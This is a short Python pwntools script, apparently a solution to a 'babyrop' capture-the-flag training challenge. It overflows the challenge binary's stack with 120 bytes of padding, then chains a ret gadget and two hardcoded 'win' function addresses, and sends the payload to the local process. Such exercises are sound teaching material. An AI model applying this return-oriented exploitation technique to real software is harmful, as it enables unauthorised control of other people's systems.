from pwn import *

offset = b'A'*120
win_1 = p64(0x40261e)
win_2 = p64(0x4026cb)
ret = p64(0x40101a)

payload = offset
payload += ret
payload += win_1
payload += win_2
print(payload)
with open("run", 'wb') as file:
    file.write(payload)
r = process('/challenge/babyrop_level2.0')
r.recvuntil(b'address).\n')
r.sendline(payload)
r.interactive()